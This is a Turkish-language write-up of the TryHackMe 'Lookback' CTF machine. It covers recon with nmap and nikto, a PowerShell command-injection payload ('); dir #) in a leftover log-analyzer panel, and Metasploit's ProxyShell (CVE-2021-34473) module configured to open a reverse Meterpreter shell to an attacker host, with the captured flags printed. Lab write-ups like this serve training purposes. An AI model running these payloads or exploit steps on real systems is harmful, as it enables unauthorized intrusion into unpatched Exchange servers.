# TryHackMe - Lookback Writeup

## Giriş

Bu yazıda TryHackMe üzerindeki **Lookback** makinesinin çözümünü paylaşıyorum. Senaryoya göre Lookback şirketi Active Directory entegrasyonuna yeni başlamış ve yaklaşan bir deadline yüzünden sistem entegratörü ortamı aceleye getirerek kurmuş. Bizden istenen, production ortamında bir vulnerability test çalıştırıp açıkları tespit etmek.

Makine ICMP'ye cevap vermiyor, o yüzden nmap taramalarında `-Pn` kullanmayı unutmuyoruz.

---

## Keşif (Recon)

İlk iş olarak klasik bir tam port taraması attım:

```
nmap -sS -A -p- -Pn 10.112.141.99
```

Çıktıda dikkatimi çeken portlar şunlardı:

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
443/tcp  open  ssl/https
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
```

SSL sertifikasının Subject Alternative Name kısmında `WIN-12OUO7A66M7.thm.local` diye bir domain adı geçiyordu. Bunu doğrudan `/etc/hosts` dosyama ekledim, çünkü IIS gibi sunucular çoğu zaman hostname'e göre farklı içerik döndürebiliyor (virtual host routing):

```
echo "10.112.141.99 WIN-12OUO7A66M7.thm.local" >> /etc/hosts
```

443 portuna tarayıcıdan gittiğimde beni doğrudan bir Outlook Web Access (OWA) login sayfasına yönlendirdi:

```
https://10.112.141.99/owa/auth/logon.aspx?url=https%3a%2f%2f10.112.141.99%2fowa%2f&reason=0
```

Bu da bana ortamda **Microsoft Exchange** olduğunu gösterdi — nmap çıktısındaki sertifika bilgileriyle de örtüşüyordu.

### Dizin taraması

Standart bir ffuf taraması denedim ama sonuç alamadım:

```
ffuf -u http://10.112.141.99/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,301,302
```

Boş dönünce nikto ve whatweb ile devam ettim.

```
nikto -h 10.112.141.99
whatweb 10.112.141.99
```

Nikto çıktısında işime yarayan iki şey vardı:

```
+ /Autodiscover/Autodiscover.xml: Retrieved x-powered-by header: ASP.NET.
+ /Autodiscover/Autodiscover.xml: Uncommon header 'x-feserver' found, with contents: WIN-12OUO7A66M7.
+ /Rpc: Uncommon header 'request-id' found, with contents: 3de2ee56-9a8f-444b-a570-567349d105b8.
+ /Rpc: Default account found for '' at (ID 'admin', PW 'admin'). Generic account discovered.
```

`/Autodiscover` ve `/Rpc` yolları da Exchange varlığını doğruluyordu. Nikto ayrıca `/Rpc` altında `admin:admin` gibi bir default hesap olduğunu iddia etti; bunu OWA login'inde denedim ama sonuç 403 döndü, bu yolda ilerlemedim.

whatweb çıktısı da OWA sayfasını ve ASP.NET'i teyit etti:

```
https://10.112.141.99/owa/auth/logon.aspx?... [200 OK] ... Outlook-Web-App ...
```

---

## Gizli bir arayüz buluyorum

OWA tarafında bir şey bulamayınca, hostname üzerinde biraz gezinmeye karar verdim. `https://win-12ouo7a66m7.thm.local/` adresine `/test` yolunu ekleyip denedim ve karşıma beklenmedik bir panel çıktı:

```
This interface should be removed on production!

THM{Security_Through_Obscurity_Is_Not_A_Defense}
```

**İlk flag burada geldi.** Panelin adı **LOG ANALYZER**'dı ve içinde bir `Path` parametresi vardı. Bu parametre `BitlockerActiveMonitoringLogs` isimli bir log dosyasının yolunu tutuyor ve muhtemelen içeriği `Get-Content` ile PowerShell tarafında okutuluyordu.

---

## Command Injection ile RCE

Panelin `Path` parametresini incelerken, girdinin sanitize edilmeden doğrudan bir PowerShell komutuna (`Get-Content`) enjekte edildiğini fark ettim. Yani klasik bir **komut enjeksiyonu (command injection)** açığıyla karşı karşıyaydım.

Amacım, uygulamanın kurduğu orijinal `Get-Content` komutundan "kaçıp" kendi komutumu çalıştırmaktı. Kullandığım payload şuydu:

```
'); dir #
```

Bunu parça parça açıklayayım:

- `');` → Orijinal komutun açık kalan tek tırnak ve parantezini kapatıyor, komutu sonlandırıyor.
- `dir` → Benim eklediğim, dizin listelemesi yapan PowerShell komutu.
- `#` → Orijinal komutun geri kalan kısmını yorum satırına çeviriyor, böylece sözdizimi hatası almıyorum.

Bunu path parametresine ekleyip (`BitlockerActiveMonitoringLogs'); dir #`) denedim ve çalıştı — dizin içeriğini listeleyebildim. `pwd` ile baktığımda `C:\Windows\System32\inetsrv` altında çalıştığımı gördüm.

Buradan sonra hedefim Desktop altındaki `user.txt` dosyasıydı:

```
BitlockerActiveMonitoringLogs'); type c:\users\dev\desktop\user.txt #
```

```
THM{Stop_Reading_Start_Doing}
```

**İkinci flag de cebimde.**

Desktop'ı `dir` ile listelediğimde bir `TODO.txt` dosyası daha gördüm, onu da okudum:

```
BitlockerActiveMonitoringLogs'); dir c:\users\dev\desktop\ #
BitlockerActiveMonitoringLogs'); type c:\users\dev\desktop\TODO.txt #
```

İçeriği şöyleydi:

```
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer [TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]

When you are done with the tasks please send an email to:
joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local
```

Bu not aslında yol haritamı çizdi. İki şey öne çıkıyordu:

1. **Exchange kurulu ama güvenlik güncellemesi yapılmamış** ("Install the Security Update for MS Exchange [TO BE DONE]")
2. Kullanabileceğim bir e-posta adresi: `dev-infrastracture-team@thm.local`

Tek başına bu not "kesin ProxyShell var" demek değil elbette, ama üst üste gelen ipuçları güçlüydü:

- Recon sırasında zaten `/owa/`, `/owa/auth/logon.aspx`, `/Autodiscover/Autodiscover.xml`, `/Rpc` gibi Exchange'e özgü yolları görmüştüm.
- `x-feserver: WIN-12OUO7A66M7` header'ı da Exchange front-end server'ını doğruluyordu.
- Not, güncellemenin yapılmadığını açıkça söylüyordu.

Bu kombinasyon bana **CVE-2021-34473 (ProxyShell)** ihtimalini düşündürdü.

---

## ProxyShell ile RCE (CVE-2021-34473)

Metasploit'te hazır modülü aradım:

```
msf > search proxyshell
```

```
0  exploit/windows/http/exchange_proxyshell_rce  2021-04-06  excellent  Yes  Microsoft Exchange ProxyShell RCE
```

Modülü seçip gerekli ayarları yaptım:

```
use exploit/windows/http/exchange_proxyshell_rce
set RHOSTS 10.112.141.99
set RPORT 443
set VHOST WIN-12OUO7A66M7.thm.local
set SSL true
set LHOST <attacker_ip>
set LPORT 4444
```

`check` komutuyla önce hedefin gerçekten savunmasız olup olmadığını doğruladım:

```
[+] 10.112.141.99:443 - The target is vulnerable.
```

İlk `run` denemesinde exploit, yönetim rolüne sahip bir kullanıcı bulamadığı için başarısız oldu:

```
[*] Enumerated 0 email addresses
[-] Exploit aborted due to failure: no-access: No user with the necessary management role was identified
```

Burada aklıma TODO.txt'de gördüğüm e-posta adresi geldi. `EMAIL` parametresine onu verdim:

```
set EMAIL dev-infrastracture-team@thm.local
```

Tekrar `check` ve `run`:

```
[+] The target is vulnerable.
[*] Attempt to exploit for CVE-2021-34473
[*] Retrieving backend FQDN over RPC request
[*] Internal server name: win-12ouo7a66m7.thm.local
[*] Assigning the 'Mailbox Import Export' role via dev-infrastracture-team@thm.local
[+] Successfully assigned the 'Mailbox Import Export' role
[*] Writing to: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\kt52oHEt.aspx
[*] Triggering the payload
[*] Sending stage (203846 bytes) to 10.112.141.99
[*] Meterpreter session 1 opened (attacker_ip:4444 -> 10.112.141.99:10071)
```

Bu sefer çalıştı ve bir **Meterpreter oturumu** açtım. Exploit arka planda kendi webshell'ini ve mail export request'ini de temizledi.

---

## Son Flag

Oturumu aldıktan sonra Administrator kullanıcısının klasörlerine baktım:

```
meterpreter > cd Desktop
meterpreter > ls
```

Desktop'ta işe yarar bir şey yoktu, `Documents` klasörüne geçtim:

```
meterpreter > cd ..
meterpreter > cd Documents
meterpreter > ls
```

```
100666/rw-rw-rw-  35  fil  2023-02-12 14:57:18 -0500  flag.txt
```

```
meterpreter > cat flag.txt
THM{Looking_Back_Is_Not_Always_Bad}
```

Ve son flag de böylece elime geçti — makine adına da (**Lookback**) güzel bir gönderme oluyor.

---

## Özet ve Çıkarımlar

Bu makinede takip ettiğim zincir kısaca şöyleydi:

1. Nmap ile portları ve Exchange/IIS izlerini keşfettim, SSL sertifikasındaki hostname'i `/etc/hosts`'a ekleyerek gizli sanal host'a erişim sağladım.
2. `/test` yolunda unutulmuş bir "Log Analyzer" arayüzü buldum — production'da olmaması gereken bir debug/test paneliydi.
3. Panelin `Path` parametresinde sanitize edilmemiş bir command injection açığı vardı, bunu `'); <komut> #` payload'ıyla istismar ederek dosya sistemine erişim sağladım.
4. Bulduğum bir TODO notundan, Exchange'in yamalanmadığı ve kullanılabilecek bir e-posta adresi bilgisini edindim.
5. Bu bilgiyi kullanarak Metasploit'in ProxyShell (CVE-2021-34473) modülüyle sistem üzerinde tam yetkili bir Meterpreter shell aldım.

Bu makine aslında gerçek dünyada da sıkça karşılaşılan bir senaryoyu güzel özetliyor: aceleye getirilmiş deployment'lar, production'da unutulmuş debug arayüzleri ve yamalanmamış Exchange sunucuları — üçü bir araya geldiğinde domain'in tamamen ele geçirilmesine kadar gidebiliyor.

**Alınan flag'ler:**
- `THM{Security_Through_Obscurity_Is_Not_A_Defense}`
- `THM{Stop_Reading_Start_Doing}`
- `THM{Looking_Back_Is_Not_Always_Bad}`
